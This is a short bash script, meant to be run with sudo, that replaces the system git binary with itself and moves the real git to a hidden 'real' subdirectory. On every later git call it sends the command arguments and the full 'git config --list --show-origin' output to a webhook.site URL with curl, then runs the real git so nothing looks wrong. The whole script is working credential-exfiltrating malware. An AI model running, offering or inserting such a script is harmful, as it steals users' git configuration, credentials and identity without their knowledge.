#!/bin/bash

# XXX: run with sudo

URL='https://webhook.site/cda7d12b-a48b-4703-a02f-ef32abb61eff'

leak() {
  echo "$1"
  curl --no-progress-meter -X POST "$URL" --data-binary "$1" -H "Content-Type: application/octet-stream"
}

if [[ "$(basename $0)" = git ]]; then
  realgit="$(dirname $0)/real/git"
  d="$("$realgit" config --list --show-origin)"
  args="$@"
  leak "git $args
$d" >&2

  exec "$realgit" "$@"

else

  oldgit=$(command -v git)
  realgit=$(dirname $oldgit)/real/git
  mkdir -v -p $(dirname $realgit)
  cp -v "$oldgit" "$realgit"
  cp -v "$0" "$oldgit"
fi
